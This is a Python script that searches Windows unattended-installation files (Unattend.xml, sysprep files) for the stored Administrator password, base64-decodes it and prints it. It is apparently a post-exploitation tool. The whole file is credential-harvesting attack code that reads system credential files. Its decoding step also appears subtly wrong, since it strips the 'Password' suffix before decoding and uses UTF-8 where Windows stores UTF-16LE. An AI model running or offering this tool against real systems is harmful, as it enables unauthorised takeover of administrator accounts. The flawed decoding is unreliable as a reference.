#!/usr/bin/env python3
"""
Module to extract and decode Administrator password from Unattended files
"""
import os
import re
import base64

def find_unattend_files():
    """Finds common unattended installation files"""
    search_paths = [
        r"C:\Windows\Panther\Unattend.xml",
        r"C:\Windows\Panther\autounattend.xml",
        r"C:\Windows\System32\sysprep\sysprep.inf",
        r"C:\Windows\System32\sysprep\unattend.xml"
    ]
    found_files = [p for p in search_paths if os.path.exists(p)]
    return found_files

def extract_and_decode(files):
    """Extracts and base64 decodes the password from files"""
    for file in files:
        try:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                match = re.search(r'<AdministratorPassword>.*?<Value>(.*?)</Value>', content, re.DOTALL | re.IGNORECASE)
                if match:
                    encoded_pass = match.group(1).strip()
                    if encoded_pass.endswith("Password"):
                        encoded_pass = encoded_pass[:-8]
                    return base64.b64decode(encoded_pass).decode('utf-8')
        except Exception:
            continue
    return None

if __name__ == "__main__":
    files = find_unattend_files()
    if files:
        password = extract_and_decode(files)
        if password:
            print(f"Password found: {password}")
